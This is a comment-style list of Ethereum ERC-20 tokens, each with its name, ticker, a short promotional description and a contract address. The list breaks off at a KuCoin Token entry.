// Platon Finance is a blockchain digital ecosystem that represents a bridge for all the people and business owners so everybody could learn, understand, use and benefit from blockchain, a revolution of technology. See the future in a new light with Platon.
// 0x429D83Bb0DCB8cdd5311e34680ADC8B12070a07f

// OriginToken (OGN)
// Origin Protocol is a platform for creating decentralized marketplaces on the blockchain.
// 0x8207c1ffc5b6804f6024322ccf34f29c3541ae26


// STASIS EURS Token (EURS)
// EURS token is a virtual financial asset that is designed to digitally mirror the EURO on the condition that its value is tied to the value of its collateral.
// 0xdb25f211ab05b1c97d595516f45794528a807ad8

// Smooth Love Potion (SLP)
// Smooth Love Potions (SLP) is a ERC-20 token that is fully tradable.
// 0xcc8fa225d80b9c7d42f96e9570156c65d6caaa25

// Balancer (BAL)
// Balancer is a n-dimensional automated market-maker that allows anyone to create or add liquidity to customizable pools and earn trading fees. Instead of the traditional constant product AMM model, Balancer’s formula is a generalization that allows any number of tokens in any weights or trading fees.
// 0xba100000625a3754423978a60c9317c58a424e3d

// renBTC (renBTC)
// renBTC is a one for one representation of BTC on Ethereum via RenVM.
// 0xeb4c2781e4eba804ce9a9803c67d0893436bb27d

// Bancor (BNT)
// Bancor is an on-chain liquidity protocol that enables constant convertibility between tokens. Conversions using Bancor are executed against on-chain liquidity pools using automated market makers to price and process transactions without order books or counterparties.
// 0x1f573d6fb3f13d689ff844b4ce37794d79a7ff1c

// Revain (REV)
// Revain is a blockchain-based review platform for the crypto community. Revain's ultimate goal is to provide high-quality reviews on all global products and services using emerging technologies like blockchain and AI.
// 0x2ef52Ed7De8c5ce03a4eF0efbe9B7450F2D7Edc9

// Rocket Pool (RPL)
// 0xd33526068d116ce69f19a9ee46f0bd304f21a51f

// Rocket Pool (RPL)
// Token contract has migrated to 0xD33526068D116cE69F19A9ee46F0bd304F21A51f
// 0xb4efd85c19999d84251304bda99e90b92300bd93

// Kyber Network Crystal v2 (KNC)
// Kyber is a blockchain-based liquidity protocol that aggregates liquidity from a wide range of reserves, powering instant and secure token exchange in any decentralized application.
// 0xdeFA4e8a7bcBA345F687a2f1456F5Edd9CE97202

// Iron Bank EUR (ibEUR)
// Fixed Forex is the collective name for USD, EUR, ZAR, JPY, CNY, AUD, AED, CAD, INR, and any other forex pairs launched under the Fixed Forex moniker.
// 0x96e61422b6a9ba0e068b6c5add4ffabc6a4aae27

// Synapse (SYN)
// Synapse is a cross-chain layer ∞ protocol powering interoperability between blockchains.
// 0x0f2d719407fdbeff09d87557abb7232601fd9f29

// XSGD (XSGD)
// StraitsX is the pioneering payments infrastructure for the digital assets space in Southeast Asia developed by Singapore-based FinTech Xfers Pte. Ltd, a Major Payment Institution licensed by the Monetary Authority of Singapore for e-money issuance
// 0x70e8de73ce538da2beed35d14187f6959a8eca96

// dYdX (DYDX)
// DYDX is a governance token that allows the dYdX community to truly govern the dYdX Layer 2 Protocol. By enabling shared control of the protocol, DYDX allows traders, liquidity providers, and partners of dYdX to work collectively towards an enhanced Protocol.
// 0x92d6c1e31e14520e676a687f0a93788b716beff5

// Reserve Rights (RSR)
// The fluctuating protocol token that plays a role in stabilizing RSV and confers the cryptographic right to purchase excess Reserve tokens as the network grows.
// 0x320623b8e4ff03373931769a31fc52a4e78b5d70

// Illuvium (ILV)
// Illuvium is a decentralized, NFT collection and auto battler game built on the Ethereum network.
// 0x767fe9edc9e0df98e07454847909b5e959d7ca0e

// CEEK (CEEK)
// Universal Currency for VR & Entertainment Industry. Working Product Partnered with NBA Teams, Universal Music and Apple
// 0xb056c38f6b7dc4064367403e26424cd2c60655e1

// Chroma (CHR)
// Chromia is a relational blockchain designed to make it much easier to make complex and scalable dapps.
// 0x8A2279d4A90B6fe1C4B30fa660cC9f926797bAA2

// Telcoin (TEL)
// A cryptocurrency distributed by your mobile operator and accepted everywhere.
// 0x467Bccd9d29f223BcE8043b84E8C8B282827790F

// KEEP Token (KEEP)
// A keep is an off-chain container for private data.
// 0x85eee30c52b0b379b046fb0f85f4f3dc3009afec

// Pundi X Token (PUNDIX)
// To provide developers increased use cases and token user base by supporting offline and online payment of their custom tokens in Pundi X‘s ecosystem.
// 0x0fd10b9899882a6f2fcb5c371e17e70fdee00c38

// PowerLedger (POWR)
// Power Ledger is a peer-to-peer marketplace for renewable energy.
// 0x595832f8fc6bf59c85c527fec3740a1b7a361269

// Render Token (RNDR)
// RNDR (Render Network) bridges GPUs across the world in order to provide much-needed power to artists, studios, and developers who rely on high-quality rendering to power their creations. The mission is to bridge the gap between GPU supply/demand through the use of distributed GPU computing.
// 0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24

// Storj (STORJ)
// Blockchain-based, end-to-end encrypted, distributed object storage, where only you have access to your data
// 0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac

// Synth sUSD (sUSD)
// A synthetic asset issued by the Synthetix protocol which tracks the price of the United States Dollar (USD). sUSD can be traded on Synthetix.Exchange for other synthetic assets through a peer-to-contract system with no slippage.
// 0x57ab1ec28d129707052df4df418d58a2d46d5f51

// BitMax token (BTMX)
// Digital asset trading platform
// 0xcca0c9c383076649604eE31b20248BC04FdF61cA

// DENT (DENT)
// Aims to disrupt the mobile operator industry by creating an open marketplace for buying and selling of mobile data.
// 0x3597bfd533a99c9aa083587b074434e61eb0a258

// FunFair (FUN)
// FunFair is a decentralised gaming platform powered by Ethereum smart contracts
// 0x419d0d8bdd9af5e606ae2232ed285aff190e711b

// XY Oracle (XYO)
// Blockchain's crypto-location oracle network
// 0x55296f69f40ea6d20e478533c15a6b08b654e758

// Metal (MTL)
// Transfer money instantly around the globe with nothing more than a phone number. Earn rewards every time you spend or make a purchase. Ditch the bank and go digital.
// 0xF433089366899D83a9f26A773D59ec7eCF30355e

// CelerToken (CELR)
// Celer Network is a layer-2 scaling platform that enables fast, easy and secure off-chain transactions.
// 0x4f9254c83eb525f9fcf346490bbb3ed28a81c667

// Ocean Token (OCEAN)
// Ocean Protocol helps developers build Web3 apps to publish, exchange and consume data.
// 0x967da4048cD07aB37855c090aAF366e4ce1b9F48

// Divi Exchange Token (DIVX)
// Digital Currency
// 0x13f11c9905a08ca76e3e853be63d4f0944326c72

// Tribe (TRIBE)
// 0xc7283b66eb1eb5fb86327f08e1b5816b0720212b

// ZEON (ZEON)
// ZEON Wallet provides a secure application that available for all major OS. Crypto-backed loans without checks.
// 0xe5b826ca2ca02f09c1725e9bd98d9a8874c30532

// Rari Governance Token (RGT)
// The Rari Governance Token is the native token behind the DeFi robo-advisor, Rari Capital.
// 0xD291E7a03283640FDc51b121aC401383A46cC623

// Injective Token (INJ)
// Access, create and trade unlimited decentralized finance markets on an Ethereum-compatible exchange protocol for cross-chain DeFi.
// 0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30

// Energy Web Token Bridged (EWTB)
// Energy Web Token (EWT) is the native token of the Energy Web Chain, a public, Proof-of-Authority Ethereum Virtual Machine blockchain specifically designed to support enterprise-grade applications in the energy sector.
// 0x178c820f862b14f316509ec36b13123da19a6054

// MEDX TOKEN (MEDX)
// Decentralized healthcare information system
// 0xfd1e80508f243e64ce234ea88a5fd2827c71d4b7

// Spell Token (SPELL)
// Abracadabra.money is a lending platform that allows users to borrow funds using Interest Bearing Tokens as collateral.
// 0x090185f2135308bad17527004364ebcc2d37e5f6

// Uquid Coin (UQC)
// The goal of this blockchain asset is to supplement the development of UQUID Ecosystem. In this virtual revolution, coin holders will have the benefit of instantly and effortlessly cash out their coins.
// 0x8806926Ab68EB5a7b909DcAf6FdBe5d93271D6e2

// Mask Network (MASK)
// Mask Network allows users to encrypt content when posting on You-Know-Where and only the users and their friends can decrypt them.
// 0x69af81e73a73b40adf4f3d4223cd9b1ece623074

// Function X (FX)
// Function X is an ecosystem built entirely on and for the blockchain. It consists of five elements: f(x) OS, f(x) public blockchain, f(x) FXTP, f(x) docker and f(x) IPFS.
// 0x8c15ef5b4b21951d50e53e4fbda8298ffad25057

// Aragon Network Token (ANT)
// Create and manage unstoppable organizations. Aragon lets you manage entire organizations using the blockchain. This makes Aragon organizations more efficient than their traditional counterparties.
// 0xa117000000f279d81a1d3cc75430faa017fa5a2e

// KyberNetwork (KNC)
// KyberNetwork is a new system which allows the exchange and conversion of digital assets.
// 0xdd974d5c2e2928dea5f71b9825b8b646686bd200

// Origin Dollar (OUSD)
// Origin Dollar (OUSD) is a stablecoin that earns yield while it's still in your wallet. It was created by the team at Origin Protocol (OGN).
// 0x2a8e1e676ec238d8a992307b495b45b3feaa5e86

// QuarkChain Token (QKC)
// A High-Capacity Peer-to-Peer Transactional System
// 0xea26c4ac16d4a5a106820bc8aee85fd0b7b2b664

// Anyswap (ANY)
// Anyswap is a mpc decentralized cross-chain swap protocol.
// 0xf99d58e463a2e07e5692127302c20a191861b4d6

// Trace (TRAC)
// Purpose-built Protocol for Supply Chains Based on Blockchain.
// 0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f

// ELF (ELF)
// elf is a decentralized self-evolving cloud computing blockchain network that aims to provide a high performance platform for commercial adoption of blockchain.
// 0xbf2179859fc6d5bee9bf9158632dc51678a4100e

// Request (REQ)
// A decentralized network built on top of Ethereum, which allows anyone, anywhere to request a payment.
// 0x8f8221afbb33998d8584a2b05749ba73c37a938a

// STPT (STPT)
// Decentralized Network for the Tokenization of any Asset.
// 0xde7d85157d9714eadf595045cc12ca4a5f3e2adb

// Ribbon (RBN)
// Ribbon uses financial engineering to create structured products that aim to deliver sustainable yield. Ribbon's first product focuses on yield through automated options strategies. The protocol also allows developers to create arbitrary structured products by combining various DeFi derivatives.
// 0x6123b0049f904d730db3c36a31167d9d4121fa6b

// HooToken (HOO)
// HooToken aims to provide safe and reliable assets management and blockchain services to users worldwide.
// 0xd241d7b5cb0ef9fc79d9e4eb9e21f5e209f52f7d

// Wrapped Celo USD (wCUSD)
// Wrapped Celo Dollars are a 1:1 equivalent of Celo Dollars. cUSD (Celo Dollars) is a stable asset that follows the US Dollar.
// 0xad3e3fc59dff318beceaab7d00eb4f68b1ecf195

// Dawn (DAWN)
// Dawn is a utility token to reward competitive gaming and help players to build their professional Esports careers.
// 0x580c8520deda0a441522aeae0f9f7a5f29629afa

// StormX (STMX)
// StormX is a gamified marketplace that enables users to earn STMX ERC-20 tokens by completing micro-tasks or shopping at global partner stores online. Users can earn staking rewards, shopping, and micro-task benefits for holding STMX in their own wallet.
// 0xbe9375c6a420d2eeb258962efb95551a5b722803

// BandToken (BAND)
// A data governance framework for Web3.0 applications operating as an open-source standard for the decentralized management of data. Band Protocol connects smart contracts with trusted off-chain information, provided through community-curated oracle data providers.
// 0xba11d00c5f74255f56a5e366f4f77f5a186d7f55

// NKN (NKN)
// NKN is the new kind of P2P network connectivity protocol & ecosystem powered by a novel public blockchain.
// 0x5cf04716ba20127f1e2297addcf4b5035000c9eb

// Reputation (REPv2)
// Augur combines the magic of prediction markets with the power of a decentralized network to create a stunningly accurate forecasting tool
// 0x221657776846890989a759ba2973e427dff5c9bb

// Alchemy (ACH)
// Alchemy Pay (ACH) is a Singapore-based payment solutions provider that provides online and offline merchants with secure, convenient fiat and crypto acceptance.
// 0xed04915c23f00a313a544955524eb7dbd823143d

// Orchid (OXT)
// Orchid enables a decentralized VPN.
// 0x4575f41308EC1483f3d399aa9a2826d74Da13Deb

// Fetch (FET)
// Fetch.ai is building tools and infrastructure to enable a decentralized digital economy by combining AI, multi-agent systems and advanced cryptography.
// 0xaea46A60368A7bD060eec7DF8CBa43b7EF41Ad85

// Propy (PRO)
// Property Transactions Secured Through Blockchain.
// 0x226bb599a12c826476e3a771454697ea52e9e220

// Adshares (ADS)
// Adshares is a Web3 protocol for monetization space in the Metaverse. Adserver platforms allow users to rent space inside Metaverse, blockchain games, NFT exhibitions and websites.
// 0xcfcecfe2bd2fed07a9145222e8a7ad9cf1ccd22a

// FLOKI (FLOKI)
// The Floki Inu protocol is a cross-chain community-driven token available on two blockchains: Ethereum (ETH) and Binance Smart Chain (BSC).
// 0xcf0c122c6b73ff809c693db761e7baebe62b6a2e

// Aurora (AURORA)
// Aurora is an EVM built on the NEAR Protocol, a solution for developers to operate their apps on an Ethereum-compatible, high-throughput, scalable and future-safe platform, with a fully trustless bridge architecture to connect Ethereum with other networks.
// 0xaaaaaa20d9e0e2461697782ef11675f668207961

// Token Prometeus Network (PROM)
// Prometeus Network fuels people-owned data markets, introducing new ways to interact with data and profit from it. They use a peer-to-peer approach to operate beyond any border or jurisdiction.
// 0xfc82bb4ba86045af6f327323a46e80412b91b27d

// Ankr Eth2 Reward Bearing Certificate (aETHc)
// Ankr's Eth2 staking solution provides the best user experience and highest level of safety, combined with an attractive reward mechanism and instant staking liquidity through a bond-like synthetic token called aETH.
// 0xE95A203B1a91a908F9B9CE46459d101078c2c3cb

// Numeraire (NMR)
// NMR is the scarcity token at the core of the Erasure Protocol. NMR cannot be minted and its core use is for staking and burning. The Erasure Protocol brings negative incentives to any website on the internet by providing users with economic skin in the game and punishing bad actors.
// 0x1776e1f26f98b1a5df9cd347953a26dd3cb46671

// RLC (RLC)
// Blockchain Based distributed cloud computing
// 0x607F4C5BB672230e8672085532f7e901544a7375

// Compound Basic Attention Token (cBAT)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x6c8c6b02e7b2be14d4fa6022dfd6d75921d90e4e

// Bifrost (BFC)
// Bifrost is a multichain middleware platform that enables developers to create Decentralized Applications (DApps) on top of multiple protocols.
// 0x0c7D5ae016f806603CB1782bEa29AC69471CAb9c

// Boba Token (BOBA)
// Boba is an Ethereum L2 optimistic rollup that reduces gas fees, improves transaction throughput, and extends the capabilities of smart contracts through Hybrid Compute. Users of Boba’s native fast bridge can withdraw their funds in a few minutes instead of the usual 7 days required by other ORs.
// 0x42bbfa2e77757c645eeaad1655e0911a7553efbc

// AlphaToken (ALPHA)
// Alpha Finance Lab is an ecosystem of DeFi products and focused on building an ecosystem of automated yield-maximizing Alpha products that interoperate to bring optimal alpha to users on a cross-chain level.
// 0xa1faa113cbe53436df28ff0aee54275c13b40975

// SingularityNET Token (AGIX)
// Decentralized marketplace for artificial intelligence.
// 0x5b7533812759b45c2b44c19e320ba2cd2681b542

// Dusk Network (DUSK)
// Dusk streamlines the issuance of digital securities and automates trading compliance with the programmable and confidential securities.
// 0x940a2db1b7008b6c776d4faaca729d6d4a4aa551

// CocosToken (COCOS)
// The platform for the next generation of digital game economy.
// 0x0c6f5f7d555e7518f6841a79436bd2b1eef03381

// Beta Token (BETA)
// Beta Finance is a cross-chain permissionless money market protocol for lending, borrowing, and shorting crypto. Beta Finance has created an integrated “1-Click” Short Tool to initiate, manage, and close short positions, as well as allow anyone to create money markets for a token automatically.
// 0xbe1a001fe942f96eea22ba08783140b9dcc09d28

// USDK (USDK)
// USDK-Stablecoin Powered by Blockchain and US Licenced Trust Company
// 0x1c48f86ae57291f7686349f12601910bd8d470bb

// Veritaseum (VERI)
// Veritaseum builds blockchain-based, peer-to-peer capital markets as software on a global scale.
// 0x8f3470A7388c05eE4e7AF3d01D8C722b0FF52374

// mStable USD (mUSD)
// The mStable Standard is a protocol with the goal of making stablecoins and other tokenized assets easy, robust, and profitable.
// 0xe2f2a5c287993345a840db3b0845fbc70f5935a5

// Marlin POND (POND)
// Marlin is an open protocol that provides a high-performance programmable network infrastructure for Web 3.0
// 0x57b946008913b82e4df85f501cbaed910e58d26c

// Automata (ATA)
// Automata is a privacy middleware layer for dApps across multiple blockchains, built on a decentralized service protocol.
// 0xa2120b9e674d3fc3875f415a7df52e382f141225

// TrueFi (TRU)
// TrueFi is a DeFi protocol for uncollateralized lending powered by the TRU token. TRU Stakers to assess the creditworthiness of the loans
// 0x4c19596f5aaff459fa38b0f7ed92f11ae6543784

// Rupiah Token (IDRT)
// Rupiah Token (IDRT) is the first fiat-collateralized Indonesian Rupiah Stablecoin. Developed by PT Rupiah Token Indonesia, each IDRT is worth exactly 1 IDR.
// 0x998FFE1E43fAcffb941dc337dD0468d52bA5b48A

// Aergo (AERGO)
// Aergo is an open platform that allows businesses to build innovative applications and services by sharing data on a trustless and distributed IT ecosystem.
// 0x91Af0fBB28ABA7E31403Cb457106Ce79397FD4E6

// DODO bird (DODO)
// DODO is a on-chain liquidity provider, which leverages the Proactive Market Maker algorithm (PMM) to provide pure on-chain and contract-fillable liquidity for everyone.
// 0x43Dfc4159D86F3A37A5A4B3D4580b888ad7d4DDd

// Keep3rV1 (KP3R)
// Keep3r Network is a decentralized keeper network for projects that need external devops and for external teams to find keeper jobs.
// 0x1ceb5cb57c4d4e2b2433641b95dd330a33185a44

// ALICE (ALICE)
// My Neighbor Alice is a multiplayer builder game, where anyone can buy and own virtual islands, collect and build items and meet new friends.
// 0xac51066d7bec65dc4589368da368b212745d63e8

// Litentry (LIT)
// Litentry is a Decentralized Identity Aggregator that enables linking user identities across multiple networks.
// 0xb59490ab09a0f526cc7305822ac65f2ab12f9723

// Covalent Query Token (CQT)
// Covalent aggregates information from across dozens of sources including nodes, chains, and data feeds. Covalent returns this data in a rapid and consistent manner, incorporating all relevant data within one API interface.
// 0xd417144312dbf50465b1c641d016962017ef6240

// BitMartToken (BMC)
// BitMart is a globally integrated trading platform founded by a group of cryptocurrency enthusiasts.
// 0x986EE2B944c42D017F52Af21c4c69B84DBeA35d8

// Proton (XPR)
// Proton is a new public blockchain and dApp platform designed for both consumer applications and P2P payments. It is built around a secure identity and financial settlements layer that allows users to directly link real identity and fiat accounts, pull funds and buy crypto, and use crypto seamlessly.
// 0xD7EFB00d12C2c13131FD319336Fdf952525dA2af

// Aurora DAO (AURA)
// Aurora is a collection of Ethereum applications and protocols that together form a decentralized banking and finance platform.
// 0xcdcfc0f66c522fd086a1b725ea3c0eeb9f9e8814

// CarryToken (CRE)
// Carry makes personal data fair for consumers, marketers and merchants
// 0x115ec79f1de567ec68b7ae7eda501b406626478e

// LCX (LCX)
// LCX Terminal is made for Professional Cryptocurrency Portfolio Management
// 0x037a54aab062628c9bbae1fdb1583c195585fe41

// Gitcoin (GTC)
// GTC is a governance token with no economic value. GTC governs Gitcoin, where they work to decentralize grants, manage disputes, and govern the treasury.
// 0xde30da39c46104798bb5aa3fe8b9e0e1f348163f

// BOX Token (BOX)
// BOX offers a secure, convenient and streamlined crypto asset management system for institutional investment, audit risk control and crypto-exchange platforms.
// 0xe1A178B681BD05964d3e3Ed33AE731577d9d96dD

// Mainframe Token (MFT)
// The Hifi Lending Protocol allows users to borrow against their crypto. Hifi uses a bond-like instrument, representing an on-chain obligation that settles on a specific future date. Buying and selling the tokenized debt enables fixed-rate lending and borrowing.
// 0xdf2c7238198ad8b389666574f2d8bc411a4b7428

// UniBright (UBT)
// The unified framework for blockchain based business integration
// 0x8400d94a5cb0fa0d041a3788e395285d61c9ee5e

// QASH (QASH)
// We envision QASH to be the preferred payment token for financial services, like the Bitcoin for financial services. As more financial institutions, fintech startups and partners adopt QASH as a method of payment, the utility of QASH will scale, fueling the Fintech revolution.
// 0x618e75ac90b12c6049ba3b27f5d5f8651b0037f6

// AIOZ Network (AIOZ)
// The AIOZ Network is a decentralized content delivery network, which relies on multiple nodes spread out throughout the globe. These nodes provide computational-demanding resources like bandwidth, storage, and computational power in order to store content, share content and perform computing tasks.
// 0x626e8036deb333b408be468f951bdb42433cbf18

// Bluzelle (BLZ)
// Aims to be the next-gen database protocol for the decentralized internet.
// 0x5732046a883704404f284ce41ffadd5b007fd668

// Reserve (RSV)
// Reserve aims to create a stable decentralized currency targeted at emerging economies.
// 0x196f4727526eA7FB1e17b2071B3d8eAA38486988

// Presearch (PRE)
// Presearch is building a decentralized search engine powered by the community. Presearch utilizes its PRE cryptocurrency token to reward users for searching and to power its Keyword Staking ad platform.
// 0xEC213F83defB583af3A000B1c0ada660b1902A0F

// TORN Token (TORN)
// Tornado Cash is a fully decentralized protocol for private transactions on Ethereum.
// 0x77777feddddffc19ff86db637967013e6c6a116c

// Student Coin (STC)
// The idea of the project is to create a worldwide academically-focused cryptocurrency, supervised by university and research faculty, established by students for students. Student Coins are used to build a multi-university ecosystem of value transfer.
// 0x15b543e986b8c34074dfc9901136d9355a537e7e

// Melon Token (MLN)
// Enzyme is a way to build, scale, and monetize investment strategies
// 0xec67005c4e498ec7f55e092bd1d35cbc47c91892

// HOPR Token (HOPR)
// HOPR provides essential and compliant network-level metadata privacy for everyone. HOPR is an open incentivized mixnet which enables privacy-preserving point-to-point data exchange.
// 0xf5581dfefd8fb0e4aec526be659cfab1f8c781da

// DIAToken (DIA)
// DIA is delivering verifiable financial data from traditional and crypto sources to its community.
// 0x84cA8bc7997272c7CfB4D0Cd3D55cd942B3c9419

// EverRise (RISE)
// EverRise is a blockchain technology company that offers bridging and security solutions across blockchains through an ecosystem of decentralized applications. The EverRise token (RISE) is a multi-chain, collateralized cryptocurrency that powers the EverRise dApp ecosystem.
// 0xC17c30e98541188614dF99239cABD40280810cA3

// Refereum (RFR)
// Distribution and growth platform for games.
// 0xd0929d411954c47438dc1d871dd6081f5c5e149c


// bZx Protocol Token (BZRX)
// BZRX token.
// 0x56d811088235F11C8920698a204A5010a788f4b3

// CoinDash Token (CDT)
// Blox is an open-source, fully non-custodial staking platform for Ethereum 2.0. Their goal at Blox is to simplify staking while ensuring Ethereum stays fair and decentralized.
// 0x177d39ac676ed1c67a2b268ad7f1e58826e5b0af

// Nectar (NCT)
// Decentralized marketplace where security experts build anti-malware engines that compete to protect you.
// 0x9e46a38f5daabe8683e10793b06749eef7d733d1

// Wirex Token (WXT)
// Wirex is a worldwide digital payment platform and regulated institution endeavoring to make digital money accessible to everyone. XT is a utility token and used as a backbone for Wirex's reward system called X-Tras
// 0xa02120696c7b8fe16c09c749e4598819b2b0e915

// FOX (FOX)
// FOX is ShapeShift’s official loyalty token. Holders of FOX enjoy zero-commission trading and win ongoing USDC crypto payments from Rainfall (payments increase in proportion to your FOX holdings). Use at ShapeShift.com.
// 0xc770eefad204b5180df6a14ee197d99d808ee52d

// Tellor Tributes (TRB)
// Tellor is a decentralized oracle that provides an on-chain data bank where staked miners compete to add the data points.
// 0x88df592f8eb5d7bd38bfef7deb0fbc02cf3778a0

// OVR (OVR)
// OVR ecosystem allow users to earn by buying, selling or renting OVR Lands or just by stacking OVR Tokens while content creators can earn building and publishing AR experiences.
// 0x21bfbda47a0b4b5b1248c767ee49f7caa9b23697

// Ampleforth Governance (FORTH)
// FORTH is the governance token for the Ampleforth protocol. AMPL is the first rebasing currency and a key DeFi building block for denominating stable contracts.
// 0x77fba179c79de5b7653f68b5039af940ada60ce0

// Moss Coin (MOC)
// Location-based Augmented Reality Mobile Game based on Real Estate
// 0x865ec58b06bf6305b886793aa20a2da31d034e68

// ICONOMI (ICN)
// ICONOMI Digital Assets Management platform enables simple access to a variety of digital assets and combined Digital Asset Arrays
// 0x888666CA69E0f178DED6D75b5726Cee99A87D698

// Kin (KIN)
// The vision for Kin is rooted in the belief that a participants can come together to create an open ecosystem of tools for digital communication and commerce that prioritizes consumer experience, fair and user-oriented model for digital services.
// 0x818fc6c2ec5986bc6e2cbf00939d90556ab12ce5

// Cortex Coin (CTXC)
// Decentralized AI autonomous system.
// 0xea11755ae41d889ceec39a63e6ff75a02bc1c00d

// SpookyToken (BOO)
// SpookySwap is an automated market-making (AMM) decentralized exchange (DEX) for the Fantom Opera network.
// 0x55af5865807b196bd0197e0902746f31fbccfa58

// BZ (BZ)
// Digital asset trading exchanges, providing professional digital asset trading and OTC (Over The Counter) services.
// 0x4375e7ad8a01b8ec3ed041399f62d9cd120e0063

// Adventure Gold (AGLD)
// Adventure Gold is the native ERC-20 token of the Loot non-fungible token (NFT) project. Loot is a text-based, randomized adventure gear generated and stored on-chain, created by social media network Vine co-founder Dom Hofmann.
// 0x32353A6C91143bfd6C7d363B546e62a9A2489A20

// Decentral Games (DG)
// Decentral Games is a community-owned metaverse casino ecosystem powered by DG.
// 0x4b520c812e8430659fc9f12f6d0c39026c83588d

// SENTINEL PROTOCOL (UPP)
// Sentinel Protocol is a blockchain-based threat intelligence platform that defends against hacks, scams, and fraud using crowdsourced threat data collected by security experts; called the Sentinels.
// 0xc86d054809623432210c107af2e3f619dcfbf652

// MATH Token (MATH)
// Crypto wallet.
// 0x08d967bb0134f2d07f7cfb6e246680c53927dd30

// SelfKey (KEY)
// SelfKey is a blockchain based self-sovereign identity ecosystem that aims to empower individuals and companies to find more freedom, privacy and wealth through the full ownership of their digital identity.
// 0x4cc19356f2d37338b9802aa8e8fc58b0373296e7

// RHOC (RHOC)
// The RChain Platform aims to be a decentralized, economically sustainable public compute infrastructure.
// 0x168296bb09e24a88805cb9c33356536b980d3fc5

// THORSwap Token (THOR)
// THORswap is a multi-chain DEX aggregator built on THORChain's cross-chain liquidity protocol for all THORChain services like THORNames and synthetic assets.
// 0xa5f2211b9b8170f694421f2046281775e8468044

// Somnium Space Cubes (CUBE)
// We are an open, social & persistent VR world built on blockchain. Buy land, build or import objects and instantly monetize. Universe shaped entirely by players!
// 0xdf801468a808a32656d2ed2d2d80b72a129739f4

// Parsiq Token (PRQ)
// A Blockchain monitoring and compliance platform.
// 0x362bc847A3a9637d3af6624EeC853618a43ed7D2

// EthLend (LEND)
// Aave is an Open Source and Non-Custodial protocol to earn interest on deposits & borrow assets. It also features access to highly innovative flash loans, which let developers borrow instantly and easily; no collateral needed. With 16 different assets, 5 of which are stablecoins.
// 0x80fB784B7eD66730e8b1DBd9820aFD29931aab03

// QANX Token (QANX)
// Quantum-resistant hybrid blockchain platform. Build your software applications like DApps or DeFi and run business processes on blockchain in 5 minutes with QANplatform.
// 0xaaa7a10a8ee237ea61e8ac46c50a8db8bcc1baaa

// LockTrip (LOC)
// Hotel Booking & Vacation Rental Marketplace With 0% Commissions.
// 0x5e3346444010135322268a4630d2ed5f8d09446c

// BioPassport Coin (BIOT)
// BioPassport is committed to help make healthcare a personal component of our daily lives. This starts with a 'health passport' platform that houses a patient's DPHR, or decentralized personal health record built around DID (decentralized identity) technology.
// 0xc07A150ECAdF2cc352f5586396e344A6b17625EB

// MANTRA DAO (OM)
// MANTRA DAO is a community-governed DeFi platform focusing on Staking, Lending, and Governance.
// 0x3593d125a4f7849a1b059e64f4517a86dd60c95d

// Sai Stablecoin v1.0 (SAI)
// Sai is an asset-backed, hard currency for the 21st century. The first decentralized stablecoin on the Ethereum blockchain.
// 0x89d24a6b4ccb1b6faa2625fe562bdd9a23260359

// Rarible (RARI)
// Create and sell digital collectibles secured with blockchain.
// 0xfca59cd816ab1ead66534d82bc21e7515ce441cf

// BTRFLY (BTRFLY)
// 0xc0d4ceb216b3ba9c3701b291766fdcba977cec3a

// AVT (AVT)
// An open-source protocol that delivers the global standard for ticketing.
// 0x0d88ed6e74bbfd96b831231638b66c05571e824f

// Fusion (FSN)
// FUSION is a public blockchain devoting itself to creating an inclusive cryptofinancial platform by providing cross-chain, cross-organization, and cross-datasource smart contracts.
// 0xd0352a019e9ab9d757776f532377aaebd36fd541

// BarnBridge Governance Token (BOND)
// BarnBridge aims to offer a cross platform protocol for tokenizing risk.
// 0x0391D2021f89DC339F60Fff84546EA23E337750f

// Nuls (NULS)
// NULS is a blockchain built on an infrastructure optimized for customized services through the use of micro-services. The NULS blockchain is a public, global, open-source community project. NULS uses the micro-service functionality to implement a highly modularized underlying architecture.
// 0xa2791bdf2d5055cda4d46ec17f9f429568275047

// Pinakion (PNK)
// Kleros provides fast, secure and affordable arbitration for virtually everything.
// 0x93ed3fbe21207ec2e8f2d3c3de6e058cb73bc04d

// LON Token (LON)
// Tokenlon is a decentralized exchange and payment settlement protocol.
// 0x0000000000095413afc295d19edeb1ad7b71c952

// CargoX (CXO)
// CargoX aims to be the independent supplier of blockchain-based Smart B/L solutions that enable extremely fast, safe, reliable and cost-effective global Bill of Lading processing.
// 0xb6ee9668771a79be7967ee29a63d4184f8097143

// Wrapped NXM (wNXM)
// Blockchain based solutions for smart contract cover.
// 0x0d438f3b5175bebc262bf23753c1e53d03432bde

// Bytom (BTM)
// Transfer assets from atomic world to byteworld
// 0xcb97e65f07da24d46bcdd078ebebd7c6e6e3d750

// OKB (OKB)
// Digital Asset Exchange
// 0x75231f58b43240c9718dd58b4967c5114342a86c

// Chain (XCN)
// Chain is a cloud blockchain protocol that enables organizations to build better financial services from the ground up powered by Sequence and Chain Core.
// 0xa2cd3d43c775978a96bdbf12d733d5a1ed94fb18

// Uniswap (UNI)
// UNI token served as governance token for Uniswap protocol with 1 billion UNI have been minted at genesis. 60% of the UNI genesis supply is allocated to Uniswap community members and remaining for team, investors and advisors.
// 0x1f9840a85d5af5bf1d1762f925bdaddc4201f984

// VeChain (VEN)
// Aims to connect blockchain technology to the real world by as well as advanced IoT integration.
// 0xd850942ef8811f2a866692a623011bde52a462c1

// Frax (FRAX)
// Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC. Additionally, FXS is the value accrual and governance token of the entire Frax ecosystem.
// 0x853d955acef822db058eb8505911ed77f175b99e

// TrueUSD (TUSD)
// A regulated, exchange-independent stablecoin backed 1-for-1 with US Dollars.
// 0x0000000000085d4780B73119b644AE5ecd22b376

// Wrapped Decentraland MANA (wMANA)
// The Wrapped MANA token is not transferable and has to be unwrapped 1:1 back to MANA to transfer it. This token is also not burnable or mintable (except by wrapping more tokens).
// 0xfd09cf7cfffa9932e33668311c4777cb9db3c9be

// Wrapped Filecoin (WFIL)
// Wrapped Filecoin is an Ethereum based representation of Filecoin.
// 0x6e1A19F235bE7ED8E3369eF73b196C07257494DE

// SAND (SAND)
// The Sandbox is a virtual world where players can build, own, and monetize their gaming experiences in the Ethereum blockchain using SAND, the platform’s utility token.
// 0x3845badAde8e6dFF049820680d1F14bD3903a5d0

// KuCoin Token (KCS)
